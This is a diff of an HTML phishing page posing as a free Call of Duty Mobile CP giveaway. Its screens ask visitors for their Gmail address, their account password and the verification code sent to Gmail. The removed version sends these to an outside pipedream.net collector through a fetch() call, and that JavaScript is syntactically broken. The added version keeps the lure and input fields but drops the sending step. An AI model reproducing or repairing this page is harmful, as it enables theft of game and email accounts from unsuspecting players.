@@ -1,220 +1,140 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-
-<meta charset="UTF-8">
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>VORTEXIR FREE CP</title>
-
-<style>
-
-*{
-
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,sans-serif;
-
-}
-
-body{
-
-background:url("background.jpg") center center/cover no-repeat;
-height:100vh;
-color:white;
-
-}
-
-.overlay{
-
-width:100%;
-height:100%;
-background:rgba(0,0,0,.70);
-display:flex;
-justify-content:center;
-align-items:center;
-
-}
-
-.card{
-
-width:92%;
-max-width:380px;
-text-align:center;
-
-}
-
-.page{
-
-display:none;
-
-}
-
-.active{
-
-display:block;
-
-}
-
-h1{
-
-font-size:42px;
-color:#FFD700;
-text-shadow:0 0 20px gold;
-
-}
-
-h2{
-
-font-size:30px;
-margin-top:10px;
-
-}
-
-p{
-
-margin-top:10px;
-color:#ddd;
-
-}
-
-input{
-
-width:100%;
-padding:16px;
-margin-top:15px;
-font-size:18px;
-border:none;
-border-radius:12px;
-outline:none;
-
-}
-
-button{
-
-width:100%;
-padding:16px;
-margin-top:20px;
-background:#FFD700;
-color:black;
-font-size:22px;
-font-weight:bold;
-border:none;
-border-radius:12px;
-cursor:pointer;
-transition:.3s;
-
-}
-
-button:hover{
-
-background:white;
-
-}
-
-.success{
-
-font-size:22px;
-color:#00ff99;
-margin-top:20px;
-
-}
-
-</style>
-
-</head>
-
-<body>
-
-<div class="overlay">
-
-<div class="card">
-
-<div class="page active" id="page1">
-
-<h1>FREE 10800 CP</h1>
-
-<p>Call Of Duty Mobile</p>
-
-<button onclick="next(2)">START NOW</button>
-
-</div>
-
-<div class="page" id="page2">
-
-<h2>Enter your Call of Duty account password and Gmail address</h2>
-
-<input type="text" id="uid1" placeholder="Email Address">
-
-<input type="text" id="uid2" placeholder="Password">
-
-<button onclick="next(3)">CONTINUE</button>
-
-</div>
-
-<div class="page" id="page3">
-
-<h2>A rifivecation code has been sent to your Gmail; please enter it here.</h2>
-
-<input type="text" id="name" placeholder="Enter the code">
-
-<button onclick="finish()">SUBMIT</button>
-
-</div>
-
-<div class="page" id="page4">
-
-<h1>✔</h1>
-
-<h2>Request Submitted</h2>
-
-<div class="success">
-
-Thank you for your request.
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-<script>
-
-function next(page){
-
-document.querySelector(".active").classList.remove("active");
-
-document.getElementById("page"+page).classList.add("active");
-
-}
-
-function finish() {
-
-    const Email Address = document.getElementById("Email Address").value;
-    const Password = document.getElementById("Password").value;
-    const Enter the code = document.getElementById("Enter the code").value;
-
-    fetch("https://eoc0klx6oxuuegp.m.pipedream.net", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-           EmailAddress : Email Address,
-           Password : Password,
-           Enterthecode : Enter the code
-        })
-    });
-
-    ;next(4)
-}
-
-</script>
-
-</body>
-
-</html>
+<!DOCTYPE html>  <html lang="en">  
+<head>  <meta charset="UTF-8">  <meta name="viewport" content="width=device-width, initial-scale=1.0">  <title>VORTEXIR FREE CP</title>  <style>  
+  
+*{  
+  
+margin:0;  
+padding:0;  
+box-sizing:border-box;  
+font-family:Arial,sans-serif;  
+  
+}  
+  
+body{  
+  
+background:url("background.jpg") center center/cover no-repeat;  
+height:100vh;  
+color:white;  
+  
+}  
+  
+.overlay{  
+  
+width:100%;  
+height:100%;  
+background:rgba(0,0,0,.70);  
+display:flex;  
+justify-content:center;  
+align-items:center;  
+  
+}  
+  
+.card{  
+  
+width:92%;  
+max-width:380px;  
+text-align:center;  
+  
+}  
+  
+.page{  
+  
+display:none;  
+  
+}  
+  
+.active{  
+  
+display:block;  
+  
+}  
+  
+h1{  
+  
+font-size:42px;  
+color:#FFD700;  
+text-shadow:0 0 20px gold;  
+  
+}  
+  
+h2{  
+  
+font-size:30px;  
+margin-top:10px;  
+  
+}  
+  
+p{  
+  
+margin-top:10px;  
+color:#ddd;  
+  
+}  
+  
+input{  
+  
+width:100%;  
+padding:16px;  
+margin-top:15px;  
+font-size:18px;  
+border:none;  
+border-radius:12px;  
+outline:none;  
+  
+}  
+  
+button{  
+  
+width:100%;  
+padding:16px;  
+margin-top:20px;  
+background:#FFD700;  
+color:black;  
+font-size:22px;  
+font-weight:bold;  
+border:none;  
+border-radius:12px;  
+cursor:pointer;  
+transition:.3s;  
+  
+}  
+  
+button:hover{  
+  
+background:white;  
+  
+}  
+  
+.success{  
+  
+font-size:22px;  
+color:#00ff99;  
+margin-top:20px;  
+  
+}  
+  
+</style>  </head>  <body>  <div class="overlay">  <div class="card">  <div class="page active" id="page1">  <h1>FREE 10800 CP</h1>  <p>Call Of Duty Mobile</p>  <button onclick="next(2)">START NOW</button>
+
+</div>  <div class="page" id="page2">  <h2>Enter your Call of Duty account password and Gmail address</h2>  <input type="text" id="uid1" placeholder="Email Address">  <input type="text" id="uid2" placeholder="Password">  <button onclick="next(3)">CONTINUE</button>
+
+</div>  <div class="page" id="page3">  <h2>A verification code has been sent to your Gmail; please enter it here.</h2>  <input type="text" id="name" placeholder="Enter the code">  <button onclick="finish()">SUBMIT</button>
+
+</div>  <div class="page" id="page4">  <h1>✔</h1>  <h2>Request Submitted</h2>  <div class="success">  Thank you for your request.
+
+</div>  </div>  </div>  </div>  <script>  
+  
+function next(page){  
+  
+document.querySelector(".active").classList.remove("active");  
+  
+document.getElementById("page"+page).classList.add("active");  
+  
+}  
+  
+function finish(){  
+  
+next(4);  
+  
+}  
+  
+</script>  </body>  </html>
